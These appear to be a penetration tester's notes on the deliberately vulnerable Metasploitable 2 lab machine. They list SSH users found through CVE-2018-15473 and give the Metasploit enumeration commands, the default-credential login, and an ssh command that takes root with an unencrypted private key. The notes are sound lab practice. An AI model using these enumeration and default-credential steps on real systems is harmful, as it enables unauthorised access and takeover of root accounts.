# Enumeration Notes — Metasploitable 2 SSH

## Valid Users Discovered (CVE-2018-15473)

### Priority accounts
- msfadmin  <- DEFAULT ADMIN — try msfadmin:msfadmin first
- user
- service
- postgres
- root

### Service accounts (lower priority)
- backup, bin, daemon, distccd, ftp, games, gnats
- irc, libuuid, list, lp, mail, man, mysql, news
- nobody, postfix, proxy, sshd, sync, sys, syslog
- uucp, www-data

## Key Finding
msfadmin private key (~/.ssh/id_rsa) is unencrypted and
listed in root's authorized_keys — direct path to root.

## Commands Used

### User enumeration (Metasploit)
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS 192.168.0.102
set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
set THREADS 10
run

### Initial access
ssh msfadmin@192.168.0.102
# password: msfadmin

### Root via private key
ssh -i id_rsa \
  -o "KexAlgorithms=diffie-hellman-group1-sha1" \
  -o "HostKeyAlgorithms=ssh-rsa" \
  -o "MACs=hmac-md5" \
  -o "StrictHostKeyChecking=no" \
  root@192.168.0.102
